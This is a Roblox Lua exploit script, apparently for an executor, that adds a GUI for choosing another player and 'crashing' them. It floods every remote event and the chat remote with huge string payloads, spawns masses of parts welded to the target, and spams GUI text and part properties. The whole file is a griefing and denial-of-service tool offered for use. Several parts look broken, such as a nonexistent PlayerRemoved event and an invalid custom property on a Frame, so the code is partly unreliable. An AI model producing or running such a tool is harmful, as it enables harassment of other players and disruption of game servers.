--[[
    TARGETED PLAYER CRASH SYSTEM v2.0
    Works with Xeno Executor
    GUI-based player selection
    Multiple crash vectors for redundancy
--]]

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local HttpService = game:GetService("HttpService")
local GuiService = game:GetService("GuiService")
local UserInputService = game:GetService("UserInputService")

-- ===== CONFIGURATION =====
local CRASH_METHODS = {
    VECTOR_1 = true,  -- Network flood (remote spam)
    VECTOR_2 = true,  -- Instance explosion
    VECTOR_3 = true,  -- String overload via remote
    VECTOR_4 = false, -- Physics bombardment (disable for performance)
    VECTOR_5 = true,  -- Custom property spam
}

local MAX_PAYLOAD_SIZE = 200000  -- Characters per payload
local SPAM_INTERVAL = 0.01       -- Seconds between sends
local TARGETS_PER_CYCLE = 100    -- Instances to create per frame

-- ===== GUI CREATION =====
local function CreateGUI()
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "CrashPanel"
    ScreenGui.ResetOnSpawn = false
    
    local MainFrame = Instance.new("Frame")
    MainFrame.Size = UDim2.new(0, 350, 0, 500)
    MainFrame.Position = UDim2.new(0.5, -175, 0.5, -250)
    MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
    MainFrame.BackgroundTransparency = 0.1
    MainFrame.BorderSizePixel = 0
    MainFrame.ClipsDescendants = true
    MainFrame.Parent = ScreenGui
    
    -- Gradient
    local Gradient = Instance.new("UIGradient")
    Gradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 30, 50)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(10, 10, 20))
    })
    Gradient.Parent = MainFrame
    
    -- Title
    local Title = Instance.new("TextLabel")
    Title.Size = UDim2.new(1, 0, 0, 40)
    Title.BackgroundTransparency = 1
    Title.Text = "🎯 Target Crash System"
    Title.TextColor3 = Color3.fromRGB(255, 50, 50)
    Title.TextScaled = true
    Title.Font = Enum.Font.GothamBold
    Title.Parent = MainFrame
    
    -- Player List Box
    local PlayerListFrame = Instance.new("Frame")
    PlayerListFrame.Size = UDim2.new(0.9, 0, 0, 200)
    PlayerListFrame.Position = UDim2.new(0.05, 0, 0.15, 0)
    PlayerListFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
    PlayerListFrame.BorderSizePixel = 1
    PlayerListFrame.BorderColor3 = Color3.fromRGB(255, 50, 50)
    PlayerListFrame.Parent = MainFrame
    
    local PlayerList = Instance.new("ScrollingFrame")
    PlayerList.Size = UDim2.new(1, -10, 1, -10)
    PlayerList.Position = UDim2.new(0, 5, 0, 5)
    PlayerList.BackgroundTransparency = 1
    PlayerList.BorderSizePixel = 0
    PlayerList.ScrollBarThickness = 8
    PlayerList.CanvasSize = UDim2.new(0, 0, 0, 0)
    PlayerList.Parent = PlayerListFrame
    
    local PlayerListLayout = Instance.new("UIListLayout")
    PlayerListLayout.SortOrder = Enum.SortOrder.LayoutOrder
    PlayerListLayout.Padding = UDim.new(0, 3)
    PlayerListLayout.Parent = PlayerList
    
    -- Player buttons storage
    local PlayerButtons = {}
    
    -- Selected player display
    local SelectedLabel = Instance.new("TextLabel")
    SelectedLabel.Size = UDim2.new(0.9, 0, 0, 30)
    SelectedLabel.Position = UDim2.new(0.05, 0, 0.58, 0)
    SelectedLabel.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
    SelectedLabel.Text = "No player selected"
    SelectedLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
    SelectedLabel.TextScaled = true
    SelectedLabel.Font = Enum.Font.Gotham
    SelectedLabel.Parent = MainFrame
    
    -- Crash button
    local CrashButton = Instance.new("TextButton")
    CrashButton.Size = UDim2.new(0.9, 0, 0, 50)
    CrashButton.Position = UDim2.new(0.05, 0, 0.7, 0)
    CrashButton.BackgroundColor3 = Color3.fromRGB(200, 30, 30)
    CrashButton.Text = "💀 CRASH SELECTED PLAYER 💀"
    CrashButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    CrashButton.TextScaled = true
    CrashButton.Font = Enum.Font.GothamBold
    CrashButton.Parent = MainFrame
    
    -- Status label
    local StatusLabel = Instance.new("TextLabel")
    StatusLabel.Size = UDim2.new(0.9, 0, 0, 30)
    StatusLabel.Position = UDim2.new(0.05, 0, 0.88, 0)
    StatusLabel.BackgroundTransparency = 1
    StatusLabel.Text = "Ready"
    StatusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
    StatusLabel.TextScaled = true
    StatusLabel.Font = Enum.Font.Gotham
    StatusLabel.Parent = MainFrame
    
    -- Button effect (hover)
    CrashButton.MouseEnter:Connect(function()
        CrashButton.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
    end)
    CrashButton.MouseLeave:Connect(function()
        CrashButton.BackgroundColor3 = Color3.fromRGB(200, 30, 30)
    end)
    
    -- Refresh player list function
    local function RefreshPlayerList()
        -- Clear existing buttons
        for _, btn in ipairs(PlayerButtons) do
            btn:Destroy()
        end
        PlayerButtons = {}
        
        -- Get all players
        local playerList = Players:GetPlayers()
        local yOffset = 0
        
        for _, player in ipairs(playerList) do
            if player ~= Players.LocalPlayer then
                local btn = Instance.new("TextButton")
                btn.Size = UDim2.new(1, 0, 0, 30)
                btn.BackgroundColor3 = Color3.fromRGB(50, 50, 70)
                btn.Text = player.Name
                btn.TextColor3 = Color3.fromRGB(255, 255, 255)
                btn.TextScaled = true
                btn.Font = Enum.Font.Gotham
                btn.Parent = PlayerList
                
                -- Selection highlight
                btn.MouseButton1Click:Connect(function()
                    -- Reset all buttons
                    for _, b in ipairs(PlayerButtons) do
                        b.BackgroundColor3 = Color3.fromRGB(50, 50, 70)
                    end
                    btn.BackgroundColor3 = Color3.fromRGB(80, 80, 150)
                    SelectedLabel.Text = "Target: " .. player.Name
                    
                    -- Store selected player for crash function
                    CrashButton.Parent.SelectedPlayer = player
                end)
                
                table.insert(PlayerButtons, btn)
            end
        end
        
        -- Update canvas size
        local count = #PlayerButtons
        PlayerList.CanvasSize = UDim2.new(0, 0, 0, count * 33 + 5)
    end
    
    -- Initial refresh
    RefreshPlayerList()
    
    -- Auto-refresh on player join/leave
    Players.PlayerAdded:Connect(RefreshPlayerList)
    Players.PlayerRemoved:Connect(RefreshPlayerList)
    
    -- ===== CRASH ENGINE =====
    local CrashActive = false
    local CrashCoroutine = nil
    
    -- Vector 1: Network Flood
    local function NetworkFlood(target)
        local remotes = {}
        for _, v in ipairs(ReplicatedStorage:GetDescendants()) do
            if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
                table.insert(remotes, v)
            end
        end
        
        local payload = string.rep("X", 50000) .. string.rep("Y", 50000) .. string.rep("Z", 50000)
        
        for i = 1, 50 do
            for _, remote in ipairs(remotes) do
                pcall(function()
                    if remote:IsA("RemoteEvent") then
                        remote:FireServer(payload, payload, payload)
                    elseif remote:IsA("RemoteFunction") then
                        remote:InvokeServer(payload, payload)
                    end
                end)
            end
            task.wait(SPAM_INTERVAL)
        end
    end
    
    -- Vector 2: Instance Explosion
    local function InstanceExplosion(target)
        if not target.Character then return end
        
        local root = target.Character:FindFirstChild("HumanoidRootPart")
        if not root then return end
        
        for i = 1, TARGETS_PER_CYCLE * 5 do
            local part = Instance.new("Part")
            part.Size = Vector3.new(0.1, 0.1, 0.1)
            part.CFrame = root.CFrame + Vector3.new(math.random(-50, 50), math.random(-50, 50), math.random(-50, 50))
            part.Anchored = true
            part.CanCollide = false
            part.Transparency = 1
            part.Material = Enum.Material.SmoothPlastic
            part.Parent = workspace
            
            -- Attach to target's character so it follows
            local weld = Instance.new("Weld")
            weld.Part0 = part
            weld.Part1 = root
            weld.Parent = part
            
            -- Set properties to cause lag
            part.Name = string.rep("A", 1000)
            
            task.wait()
        end
    end
    
    -- Vector 3: String Overload
    local function StringOverload(target)
        local char = target.Character
        if not char then return end
        
        -- Find all GUI elements
        local function processGUI(gui)
            for _, child in ipairs(gui:GetDescendants()) do
                if child:IsA("TextLabel") or child:IsA("TextButton") or child:IsA("TextBox") then
                    pcall(function()
                        local longString = string.rep("ก็็็▌▓", 10000)
                        child.Text = longString
                        child.Text = longString .. longString
                    end)
                end
            end
        end
        
        -- Target player's GUI
        if target.PlayerGui then
            processGUI(target.PlayerGui)
        end
        
        -- Also spam chat via remote
        local chatRemote = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
        if chatRemote then
            local sayRemote = chatRemote:FindFirstChild("SayMessageRequest")
            if sayRemote then
                local payload = string.rep("A", MAX_PAYLOAD_SIZE)
                for i = 1, 20 do
                    pcall(function()
                        sayRemote:FireServer(payload, "All")
                    end)
                    task.wait(0.05)
                end
            end
        end
    end
    
    -- Vector 4: Physics Bombardment
    local function PhysicsBombardment(target)
        if not target.Character then return end
        
        local root = target.Character:FindFirstChild("HumanoidRootPart")
        if not root then return end
        
        for i = 1, 50 do
            local ball = Instance.new("Part")
            ball.Shape = Enum.PartType.Ball
            ball.Size = Vector3.new(50, 50, 50)
            ball.Material = Enum.Material.Neon
            ball.Anchored = false
            ball.CanCollide = true
            ball.CFrame = root.CFrame + Vector3.new(math.random(-200, 200), 200, math.random(-200, 200))
            ball.Velocity = Vector3.new(0, -1000, 0)
            ball.Parent = workspace
            
            task.wait()
        end
    end
    
    -- Vector 5: Property Spam
    local function PropertySpam(target)
        local char = target.Character
        if not char then return end
        
        local properties = {
            "Name", "Archivable", "CanCollide", "Transparency", 
            "Reflectance", "Material", "Color", "Size", "CFrame"
        }
        
        for _, part in ipairs(char:GetDescendants()) do
            if part:IsA("BasePart") then
                for i = 1, 100 do
                    pcall(function()
                        for _, prop in ipairs(properties) do
                            if prop == "Name" then
                                part.Name = string.rep("X", 1000)
                            elseif prop == "Transparency" then
                                part.Transparency = math.random()
                            elseif prop == "CFrame" then
                                part.CFrame = part.CFrame * CFrame.Angles(math.random(), math.random(), math.random())
                            else
                                -- Attempt to set property
                                part[prop] = part[prop]
                            end
                        end
                    end)
                    task.wait()
                end
            end
        end
    end
    
    -- Main crash function
    local function ExecuteCrash(target)
        if not target then
            StatusLabel.Text = "❌ No target selected!"
            StatusLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
            return
        end
        
        if CrashActive then
            StatusLabel.Text = "⚠️ Crash already in progress"
            return
        end
        
        CrashActive = true
        StatusLabel.Text = "🔥 CRASHING: " .. target.Name
        StatusLabel.TextColor3 = Color3.fromRGB(255, 200, 50)
        CrashButton.Text = "⏳ CRASHING..."
        CrashButton.BackgroundColor3 = Color3.fromRGB(150, 150, 50)
        
        -- Run in coroutine to prevent freezing
        CrashCoroutine = coroutine.create(function()
            local startTime = tick()
            
            -- Try all vectors
            if CRASH_METHODS.VECTOR_1 then
                pcall(NetworkFlood, target)
            end
            
            if CRASH_METHODS.VECTOR_2 then
                pcall(InstanceExplosion, target)
            end
            
            if CRASH_METHODS.VECTOR_3 then
                pcall(StringOverload, target)
            end
            
            if CRASH_METHODS.VECTOR_4 then
                pcall(PhysicsBombardment, target)
            end
            
            if CRASH_METHODS.VECTOR_5 then
                pcall(PropertySpam, target)
            end
            
            -- Cleanup
            CrashActive = false
            CrashButton.Text = "💀 CRASH SELECTED PLAYER 💀"
            CrashButton.BackgroundColor3 = Color3.fromRGB(200, 30, 30)
            StatusLabel.Text = "✅ Crash completed in " .. math.floor(tick() - startTime) .. "s"
            StatusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
        end)
        
        coroutine.resume(CrashCoroutine)
    end
    
    -- Connect crash button
    CrashButton.MouseButton1Click:Connect(function()
        ExecuteCrash(CrashButton.Parent.SelectedPlayer)
    end)
    
    -- Keyboard shortcut: Ctrl+Delete to crash selected
    UserInputService.InputBegan:Connect(function(input, gameProcessed)
        if gameProcessed then return end
        if input.KeyCode == Enum.KeyCode.Delete and UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then
            ExecuteCrash(CrashButton.Parent.SelectedPlayer)
        end
    end)
    
    -- Anti-removal (optional)
    ScreenGui.Parent = Players.LocalPlayer:WaitForChild("PlayerGui")
    return ScreenGui
end

-- ===== EXECUTION =====
print("[Crasher] Loading...")
local success, err = pcall(CreateGUI)
if success then
    print("[Crasher] ✅ GUI loaded successfully")
else
    warn("[Crasher] ❌ Error: " .. tostring(err))
end

-- Keep alive
while task.wait(5) do
    -- Heartbeat
end
